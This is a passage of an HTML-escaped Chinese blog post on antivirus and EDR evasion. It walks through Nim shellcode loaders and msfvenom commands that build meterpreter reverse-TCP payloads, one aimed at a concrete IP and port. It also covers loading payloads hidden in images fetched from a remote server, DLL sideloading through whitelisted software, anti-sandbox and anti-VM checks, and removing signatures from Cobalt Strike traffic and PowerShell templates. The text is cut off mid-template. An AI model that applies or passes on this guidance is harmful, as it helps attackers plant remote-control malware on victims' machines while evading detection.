class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过进程迁移shellcode_fiber.nim&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用msf/cs生成 64 位的c&lt;span class=&#34;comment&#34;&gt;#木马，将木马植入到nim代码中，注意nim代码命名中只允许出现英文，不能有-的特殊字符，编译为exe文件&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过内联&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;asm shellcode_inline_asm_bin.nim&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;去除多余的代码，用nim加载shellcode并编译为exe&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过创建的挂起进程注入 shellcode_bin.nim&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;无文件落地免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无文件落地免杀&#34;&gt;#&lt;/a&gt; 无文件落地免杀&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;参数型 nim 脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数可以选取 bin 后缀的文件或者编码后的 shellcode&lt;br&gt;
 编译 nim，与 bin 文件一起放入到对方主机中，通常 bin 文件会被查杀&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;参数编码型脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以参数形式将 hex 的 shellcode 拼接在 exe 程序后边&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f hex&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use multi/handler/exploit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/x64/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;图片隐写 nim 脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;准备两个 nim 脚本，一个的作用是将 payload.bin 通过自己设置的密码隐写，在图片中或者从隐写的图片中还原隐写的内容，另一个是用来利用隐写图片的 nim 脚本&lt;/p&gt;
&lt;p&gt;编译第二个脚本，可以选择从远程 http 获取图片并拼接密码，也可以以文件的方式读取图片。编译好的 exe 放在对方主机中，自己的隐写图片放在远程 服务器上，通过命令行调用 exe 加载远程隐写图片中的木马可以规避杀毒软件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过 socket 建立连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;类似于 nc 聊天，将客户端给服务端发送命令执行上线木马的命令获取对方&lt;br&gt;
主机的 shell，可利用 powershell 读取外部 http 的木马。&lt;/p&gt;
&lt;h4 id=&#34;shellcode转uuid-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shellcode转uuid-2&#34;&gt;#&lt;/a&gt; shellcode 转 uuid&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;准备 nim 脚本可以加载 64 位的 uuid，将上述代码转为 uuid 并添加到 nim 脚本中，运行此脚本将会弹出 calc。可以用这个方法将 shellcode 转化为 uuid 执行。&lt;/p&gt;
&lt;h3 id=&#34;应用层面免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#应用层面免杀&#34;&gt;#&lt;/a&gt; 应用层面免杀&lt;/h3&gt;
&lt;h4 id=&#34;常见查杀方式理论点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常见查杀方式理论点&#34;&gt;#&lt;/a&gt; 常见查杀方式理论点&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;特征码扫描：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所谓特征码其实就是程序内部的一串或者几串二进制机器码。特征码匹配 工作原理是先总结出某个病毒的特征码，然后在目标文件中搜索看有没有类似 的匹配，如果有匹配就暂定为病毒文件。优点：速度快，配备高性能的扫描引 擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。&lt;/p&gt;
&lt;p&gt;缺点：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不 断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征 代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏， 给用户带来麻烦。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件和校验法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;将正常文件 A 的 hash 值保存，然后如果有一个新的 A 文件发送过来计算其 hash 值，如果与正常文件的不同，那么认定为病毒文件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;沙盒检测&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基于行为的检测，看有没有一些敏感的行为来确定文件是否为病毒。优点是可能发现未知的病毒，缺点是误报相对较高，需要用户参与。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;云查杀&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;类似于特征码查杀。只是如果特征码库没有匹配值的时候会把文件上传到云端继续分析，有时候扫描病毒刚扫描出来不是病毒，但过一会儿扫描就是病毒了，这种行为就是云查杀。&lt;/p&gt;
&lt;h4 id=&#34;特征码花指令与加壳&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#特征码花指令与加壳&#34;&gt;#&lt;/a&gt; 特征码花指令与加壳&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;特征码位置修改&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;先生成一个 shellcode，并选取一个语言生成为 exe，此时不免杀但是是一个后门，通过工具提取出防病毒软件的特征码，用 ollydeg 工具对特征码的位置进行修改。&lt;/p&gt;
&lt;p&gt;采用 jmp 的方式跳转到 00 位置，赋予 00 位置为特征码，执行结束后在 call 回原来位置。&lt;/p&gt;
&lt;p&gt;即打乱了原有的执行顺序，来实现了绕过防病毒软件的检测。&lt;/p&gt;
&lt;p&gt;简而言之，特征码区域汇编移动到全 0 区域后用 jmp 调用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;花指令改入口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;添加花指令重定向修改入口地址从而打乱特征码位置。&lt;/p&gt;
&lt;p&gt;生成随机的花指令代码，通过 ollydeg 添加到 00 位置，并借助其他工具改变入口地址为花指令入口地址，花指令执行结束后再跳转到原木马的入口，实测是已失效。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对木马加壳&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;加壳：通过 UPX 对 pyinstaller 打包的程序进行加壳&lt;/p&gt;
&lt;p&gt;加资源：通过 Restorator 对木马 exe 进行伪装为正常软件的图标及版本信息&lt;/p&gt;
&lt;p&gt;加保护：由 Shielden 等工具在原有 exe 程序之外套一层保护&lt;/p&gt;
&lt;h4 id=&#34;dll劫持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dll劫持&#34;&gt;#&lt;/a&gt; dll 劫持&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;调用加载&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;准备 c++ 脚本生成 shellcode 的 dll 程序，用 dll.py 调用 dll 会上线&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;白加黑方式导入加载&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;寻找白名单的应用程序的软件，这些软件在执行时会调用 dll 文件，将自己 通过 c++ 或者其他语言写的经过免杀处理后的 dll 程序导出，(studyPE) 并绑定 在原先白程序执行时会加载的 dll 上，当对方执行此软件的时候，dll 会被加载，就会上线。&lt;/p&gt;
&lt;p&gt;可以用火绒剑监控软件运行时会加载的 dll 程序&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;白加黑方式导出编译 钓鱼操作&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一部分的应用是不能用通过 PE 工具进行导入 dll 程序的，可以自行制作原 白名单应用运行时所加载的 dll。即将自己的 dll 木马添加到原有加载的 dll 上。&lt;/p&gt;
&lt;p&gt;用 Dependencies 工具将原有 dll 反编译为源码，分别为 c、asm、h 三个文 件。新建 dll 工程，设置 VS 的相关参数，并加载原有文件，使得可以正常导出 原有 dll。写 c/c++ 脚本写免杀木马的 dll，通过隐写在图片中的木马加载。当双 击 exe 程序时，dll 被调用，通过隐写在图片中的木马被加载至内存，对方主机 上线。&lt;/p&gt;
&lt;p&gt;工具推荐:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL01yLVVuMWswZDNyL0RLTUM=&#34;&gt;https://github.com/Mr-Un1k0d3r/DKMC&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;sys回调与hook&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sys回调与hook&#34;&gt;#&lt;/a&gt; sys 回调与 hook&lt;/h4&gt;
&lt;p&gt;AV: 会检测软件有没有病毒&lt;/p&gt;
&lt;p&gt;EDR: 会检测软件的来源与功能，会对文件进行 hook，跟踪文件的走向&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;工具推荐:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzdCaXRzVGVhbS9FRFItQnlwYXNzLWRlbW8=&#34;&gt;https://github.com/7BitsTeam/EDR-Bypass-demo&lt;/span&gt; 可以过卡巴斯基、eset、360、火绒、defender、McAee 等 AV/EDR 防病毒软件。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;其他免杀技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他免杀技术&#34;&gt;#&lt;/a&gt; 其他免杀技术&lt;/h3&gt;
&lt;h4 id=&#34;反调试与反虚拟化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反调试与反虚拟化&#34;&gt;#&lt;/a&gt; 反调试与反虚拟化&lt;/h4&gt;
&lt;p&gt;近年来，各类恶意软件层出不穷，反病毒软件也更新了各种检测方案以提 高检测率。其中比较有效的方案是动态沙箱检测技术，即通过在沙箱中运行程 序并观察程序行为来判断程序是否为恶意程序。为了逃避沙箱 / 安全人员的检测， 恶意软件使用了各类识别沙箱 / 虚拟机的技术，用于判断自身程序是否运行在沙 箱 / 虚拟机中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;反调试技术&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（ 1 ）调试器检测&lt;/p&gt;
&lt;p&gt;IsDebuggerPresent API ，PEB.BeingDebugged…&lt;br&gt;
TLS 回调，hard/software breakpoints， VirtualAlloc&lt;/p&gt;
&lt;p&gt;（ 2 ）DLL 注入检测&lt;/p&gt;
&lt;p&gt;检测是否有 DLL 注入此进程来实现对进程的行为监控（HOOK）&lt;/p&gt;
&lt;p&gt;（ 3 ）Virtual Box 检测&lt;/p&gt;
&lt;p&gt;检测文件，例如 VBoxMouse.sys， VirtualBox Guest Additions directory…&lt;br&gt;
 检测注册表，进程，服务，例如 VBoxControl.exe， VBoxService…&lt;br&gt;
 检测硬件名称，MAC 地址等等…&lt;/p&gt;
&lt;p&gt;（ 4 ）VMware 检测&lt;/p&gt;
&lt;p&gt;与 VB 检测类似&lt;/p&gt;
&lt;p&gt;（ 5 ）其他虚拟平台检测&lt;/p&gt;
&lt;p&gt;如 Xen, QEMU, Wine, Paralles…&lt;/p&gt;
&lt;p&gt;（ 6 ）分析工具进程检测&lt;/p&gt;
&lt;p&gt;检测如 OD, ProcessMonitor, Autorun 等分析工具进程的存在…&lt;/p&gt;
&lt;p&gt;（ 7 ）通用沙盒 / 虚拟机检测&lt;/p&gt;
&lt;p&gt;检测是否存在特殊进程名，模块名&lt;br&gt;
通过 WMI 检测真实硬件状态，例如硬盘大小，内存大小，CPU 风扇，型&lt;br&gt;
号，BIOS 序列号名称，电源电压，温度等等…&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;沙盒平台&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;微步沙盒：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zLnRocmVhdGJvb2suY24v&#34;&gt;https://s.threatbook.cn/&lt;/span&gt;&lt;br&gt;
 腾讯哈勃分析系统：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oYWJvLnFxLmNvbS8=&#34;&gt;https://habo.qq.com/&lt;/span&gt;&lt;br&gt;
 魔盾：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWFsZHVuLmNvbS9hbmFseXNpcy8=&#34;&gt;https://www.maldun.com/analysis/&lt;/span&gt;&lt;br&gt;
 微点沙盒：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zYW5kYm94LmRlcHRoc2VjLmNvbS5jbi9pbmRleC5waHAv&#34;&gt;https://sandbox.depthsec.com.cn/index.php/&lt;/span&gt;&lt;br&gt;
 奇安信文件深度分析平台：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zYW5kYm94LnRpLnFpYW54aW4uY29tL3NhbmRib3gvcGFnZQ==&#34;&gt;https://sandbox.ti.qianxin.com/sandbox/page&lt;/span&gt;&lt;br&gt;
ANYRUN：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcHAuYW55LnJ1bi8=&#34;&gt;https://app.any.run/&lt;/span&gt;&lt;br&gt;
HybridAnalysis (Falcon Sandbox)：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaHlicmlkLWFuYWx5c2lzLmNvbS8=&#34;&gt;https://www.hybrid-analysis.com/&lt;/span&gt;&lt;br&gt;
CAPE Sandbox: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jYXBlc2FuZGJveC5jb20v&#34;&gt;https://capesandbox.com/&lt;/span&gt;&lt;br&gt;
BD Sandbox Analyzer：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYml0ZGVmZW5kZXIuY29tL2J1c2luZXNzL2VudGVycHJpc2UtcHJvZHVjdHMvc2FuZGJveC1hbmFseXplci5odG1s&#34;&gt;https://www.bitdefender.com/business/enterprise-products/sandbox-analyzer.html&lt;/span&gt;&lt;br&gt;
Joe Sanbox: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuam9lc2FuZGJveC5jb20v&#34;&gt;https://www.joesandbox.com/&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;规避 VT 检测&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（ 1 ）虚拟机检测 禁止虚拟机运行&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -f hex&lt;/code&gt; &lt;br&gt;
python 查看 cpu、memory 的核数实现，通过命令行判断当前是否是虚拟机，通过有虚拟机才有的特殊文件判断是否是虚拟机等多种方法结合起来，综合判断当前是否在虚拟机内，如果是，则不允许执行 shellcode，否则释放代码，执行上线。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8yNDgxNzUuaHRt&#34;&gt;https://www.jb51.net/article/248175.htm&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIwMjcxNy5odG1s&#34;&gt;https://www.freebuf.com/articles/system/202717.html&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xjMTk5MjA3MjcvYXJ0aWNsZS9kZXRhaWxzLzEyMjgyMDIwOQ==&#34;&gt;https://blog.csdn.net/lc19920727/article/details/122820209&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;也可以通过 c++ 语言进行综合判断当前是否在虚拟机，如果是再执行 shellcode&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NoYXJlcHViL0NoZWNrVk0tU2FuZGJveA==&#34;&gt;https://github.com/sharepub/CheckVM-Sandbox&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 2 ）调试检测 禁止 od 调试&lt;/p&gt;
&lt;p&gt;如果我们在对抗的过程中被蓝队人员拿到了样本，他想用 od 去调一下这个程序怎么走的，肯定也不会拿到本机里面调，如果这个 exe 有毒，那电脑就全完了，所以最好的选择还是虚拟机环境，首先反调试的第一个目标就是反虚拟机调试。&lt;/p&gt;
&lt;p&gt;查阅资料后发现如果使用虚拟机，一般的路径都为 (在没有修改过的情况下) C:\Program Files\VMware&lt;br&gt;
 查看几个虚拟机后发现 vm 的默认进程有 vmtoolsd.exe 和 vmacthlp.exe，直接判断进程是否存在即可起到反调试的效果&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzc1OA==&#34;&gt;https://forum.butian.net/share/758&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 3 ）反沙箱调试 禁止沙箱运行&lt;/p&gt;
&lt;p&gt;最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的程序的父进程都是 explorer。如果一个程序的父进程不是 explorer，那么我们就可以认为他是由沙箱启动的。那么我们就直接 exit 退出，这样杀软就无法继续对我们进行行为分析了。&lt;/p&gt;
&lt;p&gt;绕过：伪造父进程为 explorer.exe 呢，那么上面这种反调试的方法就行不通了。采用这种方法之后，木马仍然可以再沙箱中调试。&lt;/p&gt;
&lt;p&gt;反调试及绕过：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvbUMwWGhOU3dkaGhJU3djQkZYZTB1UQ==&#34;&gt;https://mp.weixin.qq.com/s/mC0XhNSwdhhISwcBFXe0uQ&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 4 ）程序保护 禁止虚拟机 od 调试&lt;/p&gt;
&lt;p&gt;项目推荐：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0xvcmROb3Rld29ydGh5L2FsLWtoYXNlcg==&#34;&gt;https://github.com/LordNoteworthy/al-khaser&lt;/span&gt;&lt;br&gt;
 参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMua2FmYW4uY24vdGhyZWFkLTIxODE4NjktMS0xLmh0bWw=&#34;&gt;https://bbs.kafan.cn/thread-2181869-1-1.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;al-khaser 是一个具有良好意图的 PoC “恶意软件” 应用程序，旨在强调您的反恶意软件系统。它执行一系列常见的恶意软件技巧，目的是查看您是否躲在雷达之下。&lt;/p&gt;
&lt;h4 id=&#34;二次开发cs&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二次开发cs&#34;&gt;#&lt;/a&gt; 二次开发 CS&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;反编译 cs 的 jar 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3plcjB5dS9Bd2Vzb21lLUNvYmFsdFN0cmlrZQ==&#34;&gt;https://github.com/zer0yu/Awesome-CobaltStrike&lt;/span&gt;&lt;br&gt;
 反编译 Jar 包、新建 Java（ 11 ）项目、修改上线代码、打包替换编译、替换服务客户端&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;反编译：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -cp IDEA_HOME/plugins/java-decompiler/lib/java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true &amp;lt;src.jar&amp;gt; &amp;lt;dest dir&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;具体命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;D:\program files\Java\jdk11\bin\java.exe&amp;quot; -cp &amp;quot;C:\Program Files\JetBrains\IntelliJ IDEA 2022.1.3\plugins\java-decompiler\lib\java-decompiler.jar&amp;quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike.jar coba&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;会在coba下生成.jar文件，此时在智能解压会反编译为.java后缀的源码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;对端口密码证书做特征消除&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3plcjB5dS9Bd2Vzb21lLUNvYmFsdFN0cmlrZQ==&#34;&gt;https://github.com/zer0yu/Awesome-CobaltStrike&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;cobaltstrike.beacon_keys 和 cobaltstrike.store 不要使用默认的文件，删除&lt;/p&gt;
&lt;p&gt;profile 文件要换新的，启动服务端时记得加载，或直接把 jar 包里面的默认配置给改了&lt;/p&gt;
&lt;p&gt;开在公网的 teamserver 不要使用默认端口&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对 http/s 上线流量做特征消除&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;checksum8 函数对比后续 - common\CommonUtils&amp;amp;cloudstrike\WebServer&lt;/p&gt;
&lt;p&gt;观察 cs 上线时的日志，会在木马运行时访问一个 4 位英文字符组成的文件， 逆向分析源码之后发现这四个字符经过某种算法计算之后显示为 92/93，可以以 此为基础，对源码进行修改，改变 http/https 流量的特征码，修改原流量特征。&lt;/p&gt;
&lt;p&gt;将修改好的文件编译为 class 文件，以解压缩的方式覆盖在 jar 包中，替换 原有的 class 文件，以此来使自己修改的部分生效。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对 Powershell 生成 Payload 做特征消除&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;功能生成 - 搜代码块 -&amp;gt; 找引用 (template.x86.ps1)-&amp;gt;BaseResourceUtils-&amp;gt;_buildPowerShellNoHint&lt;/p&gt;
&lt;p&gt;用自己已经免杀过的 powershell 脚本来替换原有的未免杀脚本，将文件替换为原有的模板文件，编译为 class，以压缩包的方式进行替换，由此生成的 powershell payload 是免杀的。&lt;/p&gt;
&lt;p&gt;也可以修改 artifact.exe 的特征码达到生成的 exe 文件就是免杀的，但是比较难哦。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;powershell 免杀模版文件：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;找源码中生成 powershell 木马的源文件及逻辑，修改模板文件，将模板文件改为如下内容，同时编译修改的文件为 class 文件，替换原有 class 文件中的&lt;br&gt;
文件，实现生成的文件即免杀。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Set-StrictMode -Version 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;x1=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;span class=&#34;variable&#34;&gt;$x2&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;%%DATA%%&amp;#x27;&lt;/span&gt;;&lt;span class=&#34;variable&#34;&gt;$x3&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span 